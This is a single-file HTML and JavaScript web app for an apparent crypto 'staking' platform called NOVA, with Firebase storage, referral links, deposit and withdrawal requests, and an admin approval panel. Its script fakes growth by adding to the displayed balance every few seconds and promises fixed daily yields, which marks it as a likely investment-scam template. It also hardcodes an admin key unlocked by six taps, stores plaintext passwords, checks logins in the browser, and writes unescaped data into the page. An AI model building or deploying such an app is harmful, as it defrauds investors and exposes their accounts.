<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA | Global Asset Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { background: #050505; color: white; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
        .nova-glass { background: rgba(15, 15, 15, 0.95); border: 1px solid #222; border-radius: 24px; }
        .gold-border { border: 1px solid rgba(212, 175, 55, 0.3); }
        .screen { display: none; }
        .active { display: block; animation: fadeIn 0.4s; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .btn-prime { background: linear-gradient(135deg, #D4AF37, #F2CC60); color: black; font-weight: 800; text-transform: uppercase; }
        .node-card { background: #0f0f0f; border-radius: 20px; overflow: hidden; border: 1px solid #1a1a1a; transition: 0.3s; }
        .node-card:hover { border-color: #D4AF37; }
    </style>
</head>
<body>

    <div id="auth-screen" class="p-8 flex flex-col items-center justify-center min-h-screen active">
        <div class="text-center mb-10">
            <h1 onclick="handleTaps()" class="text-6xl font-black tracking-tighter">NOVA<span class="text-[#D4AF37]">.</span></h1>
            <p class="text-[10px] tracking-[5px] text-gray-500 uppercase mt-2">Institutional Terminal v3.0</p>
        </div>
        <div class="nova-glass p-6 w-full max-w-sm">
            <input type="text" id="u-email" placeholder="Account ID" class="w-full p-4 bg-black border border-gray-800 rounded-xl mb-3 outline-none focus:border-[#D4AF37]">
            <input type="password" id="u-pass" placeholder="Passkey" class="w-full p-4 bg-black border border-gray-800 rounded-xl mb-3 outline-none focus:border-[#D4AF37]">
            <input type="text" id="adm-key" placeholder="Master Key" class="hidden w-full p-4 bg-black border border-[#D4AF37] rounded-xl mb-3 outline-none">
            <button onclick="auth()" class="btn-prime w-full p-4 rounded-xl">Access Account</button>
            <p onclick="toggleM()" id="m-text" class="text-center text-xs mt-6 text-gray-500 cursor-pointer">New here? Create Account</p>
        </div>
    </div>

    <div id="admin-panel" class="hidden fixed inset-0 bg-black z-[9999] p-6 overflow-y-auto">
        <div class="flex justify-between items-center mb-8 border-b border-gray-900 pb-4">
            <h2 class="text-[#D4AF37] font-black">ADMIN OVERRIDE</h2>
            <button onclick="location.reload()" class="bg-red-600 text-white px-4 py-2 rounded-lg text-xs font-bold">EXIT</button>
        </div>
        <div id="adm-list" class="space-y-4"></div>
    </div>

    <div id="app" class="hidden pb-32">
        <header class="p-6 flex justify-between items-center">
            <div class="flex items-center gap-3">
                <div class="w-10 h-10 bg-[#D4AF37] rounded-xl flex items-center justify-center text-black font-black" id="avatar">N</div>
                <div><p id="user-id-txt" class="text-sm font-bold uppercase">USER</p></div>
            </div>
            <i onclick="logout()" class="fa-solid fa-power-off text-gray-800"></i>
        </header>

        <div id="dash-screen" class="screen active p-6">
            <div class="nova-glass p-8 mb-6 gold-border relative">
                <p class="text-[10px] text-gray-500 tracking-widest mb-1">TOTAL CAPITAL</p>
                <h1 id="main-bal" class="text-5xl font-black my-2">$0.00</h1>
                <div class="flex gap-4 mt-4">
                    <div class="flex-1"><p class="text-[9px] text-gray-600">DAILY YIELD</p><p id="v-daily" class="text-green-500 font-bold text-xs">+$0.00</p></div>
                    <div class="flex-1"><p class="text-[9px] text-gray-600">STATUS</p><p class="text-white font-bold text-xs">ACTIVE</p></div>
                </div>
            </div>

            <h3 class="font-black text-xs tracking-widest text-gray-500 mb-4 uppercase">Staking Nodes</h3>
            <div class="grid grid-cols-2 gap-3 mb-8">
                <div class="node-card p-4">
                    <p class="text-[10px] text-gray-500">Tier 1</p>
                    <p class="font-black text-[#D4AF37]">$30.00</p>
                    <button onclick="buyNode(30, 1.5)" class="mt-3 w-full bg-white/5 text-[10px] py-2 rounded-lg font-bold">STAKE</button>
                </div>
                <div class="node-card p-4">
                    <p class="text-[10px] text-gray-500">Tier 2</p>
                    <p class="font-black text-[#D4AF37]">$100.00</p>
                    <button onclick="buyNode(100, 6.0)" class="mt-3 w-full bg-white/5 text-[10px] py-2 rounded-lg font-bold">STAKE</button>
                </div>
            </div>

            <h3 class="font-black text-xs tracking-widest text-gray-500 mb-4 uppercase">Finance</h3>
            <div class="nova-glass p-6 mb-8">
                <input type="number" id="fin-amt" placeholder="Amount ($)" class="w-full p-4 bg-black border border-gray-800 rounded-xl mb-4 outline-none">
                <input type="file" id="proof-img" class="hidden" onchange="processImg(this)">
                <button onclick="document.getElementById('proof-img').click()" class="w-full mb-3 text-[10px] text-gray-500 border border-dashed border-gray-700 p-2 rounded">Attach Proof (Optional)</button>
                <div class="flex gap-3">
                    <button onclick="requestFin('Deposit')" class="btn-prime flex-1 p-4 rounded-xl text-xs font-bold">Deposit</button>
                    <button onclick="requestFin('Withdrawal')" class="bg-gray-900 flex-1 p-4 rounded-xl text-xs font-bold">Withdraw</button>
                </div>
            </div>

            <h3 class="font-black text-xs tracking-widest text-gray-500 mb-4 uppercase">Activity</h3>
            <div id="hist-list" class="space-y-3"></div>
        </div>

        <div id="office-screen" class="screen p-6">
            <div class="nova-glass p-6 mb-6">
                <p class="text-xs text-gray-500 mb-2">My Referral Link</p>
                <p id="ref-link" class="text-[10px] text-[#D4AF37] break-all font-bold"></p>
            </div>
            <div class="nova-glass p-6">
                <h4 class="text-sm font-bold mb-4">Support</h4>
                <p class="text-xs text-gray-400">For instant assistance, contact global desk.</p>
                <button class="w-full mt-4 bg-green-600/20 text-green-500 p-3 rounded-xl text-xs font-bold">WHATSAPP SUPPORT</button>
            </div>
        </div>

        <nav class="fixed bottom-0 w-full bg-black/90 backdrop-blur-xl border-t border-gray-900 flex justify-around p-5">
            <i onclick="nav('dash-screen')" class="fa-solid fa-house text-[#D4AF37]"></i>
            <i onclick="nav('office-screen')" class="fa-solid fa-users text-gray-600"></i>
            <i onclick="logout()" class="fa-solid fa-power-off text-red-900"></i>
        </nav>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo",
            authDomain: "home-94d45.firebaseapp.com",
            projectId: "home-94d45",
            appId: "1:964390949419:web:589840cb91b7e42ecd506e"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        let activeUser = null; let base64Img = ""; window.taps = 0; window.isLogin = true;

        window.handleTaps = () => { taps++; if(taps >= 6) document.getElementById('adm-key').classList.remove('hidden'); };
        window.toggleM = () => { isLogin = !isLogin; document.getElementById('m-text').innerText = isLogin ? "New here? Create Account" : "Back to Login"; };

        window.auth = async () => {
            const id = document.getElementById('u-email').value.toLowerCase().trim();
            const pw = document.getElementById('u-pass').value;
            if(document.getElementById('adm-key').value === "nov786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); return; }
            if(!id || !pw) return;
            const uRef = doc(db, "users", id);
            const snap = await getDoc(uRef);
            if(!isLogin) {
                if(snap.exists()) return alert("Exists");
                await setDoc(uRef, { balance: 0, password: pw, daily: 0, total: 0 });
                start(id);
            } else {
                if(snap.exists() && snap.data().password === pw) start(id);
                else alert("Invalid");
            }
        };

        function start(id) {
            activeUser = id;
            document.getElementById('auth-screen').classList.remove('active');
            document.getElementById('app').classList.remove('hidden');
            document.getElementById('user-id-txt').innerText = id;
            document.getElementById('ref-link').innerText = window.location.href + "?ref=" + id;

            onSnapshot(doc(db, "users", id), d => {
                const data = d.data();
                document.getElementById('main-bal').innerText = "$" + (data.balance || 0).toFixed(2);
                document.getElementById('v-daily').innerText = "+$" + (data.daily || 0).toFixed(2);
            });
            loadHistory();
            setInterval(() => {
                let el = document.getElementById('main-bal');
                let val = parseFloat(el.innerText.replace('$',''));
                el.innerText = "$" + (val + 0.0001).toFixed(4);
            }, 3000);
        }

        window.processImg = (el) => {
            const reader = new FileReader();
            reader.onload = () => base64Img = reader.result;
            reader.readAsDataURL(el.files[0]);
        };

        window.requestFin = async (type) => {
            const amt = document.getElementById('fin-amt').value;
            if(!amt) return;
            await addDoc(collection(db, "logs"), { user: activeUser, amount: parseFloat(amt), type, status: 'Pending', proof: base64Img, time: Date.now() });
            alert("Sent!");
            base64Img = "";
        };

        window.buyNode = async (p, d) => {
            const r = doc(db, "users", activeUser); const s = await getDoc(r);
            if(s.data().balance < p) return alert("Low balance");
            await updateDoc(r, { balance: s.data().balance - p, daily: (s.data().daily || 0) + d });
            alert("Node Active!");
        };

        function loadHistory() {
            onSnapshot(query(collection(db, "logs"), where("user", "==", activeUser)), s => {
                const h = document.getElementById('hist-list'); h.innerHTML = "";
                let arr = []; s.forEach(d => arr.push(d.data()));
                arr.sort((a,b) => b.time - a.time).forEach(t => {
                    h.innerHTML += `<div class="nova-glass p-4 text-[10px] flex justify-between">
                        <span>${t.type} - $${t.amount}</span>
                        <span class="font-bold ${t.status=='Pending'?'text-yellow-500':'text-green-500'}">${t.status}</span>
                    </div>`;
                });
            });
        }

        function loadAdmin() {
            onSnapshot(query(collection(db, "logs"), where("status", "==", "Pending")), s => {
                const al = document.getElementById('adm-list'); al.innerHTML = "";
                s.forEach(d => {
                    const r = d.data();
                    al.innerHTML += `<div class="nova-glass p-5 text-xs">
                        <p>${r.user} | ${r.type} | $${r.amount}</p>
                        ${r.proof ? `<button onclick="window.open('${r.proof}')" class="text-blue-500 underline my-2 block">View Proof</button>` : ''}
                        <button onclick="approve('${d.id}','${r.user}',${r.amount},'${r.type}')" class="bg-green-600 w-full p-2 rounded mt-2">APPROVE</button>
                    </div>`;
                });
            });
        }

        window.approve = async (id, u, a, t) => {
            const uR = doc(db, "users", u); const us = await getDoc(uR);
            let nb = t === 'Deposit' ? (us.data().balance + a) : (us.data().balance - a);
            await updateDoc(uR, { balance: nb });
            await updateDoc(doc(db, "logs", id), { status: 'Verified' });
        };

        window.nav = (id) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
            document.getElementById(id).classList.add('active');
        };

        window.logout = () => location.reload();
    </script>
</body>
</html>
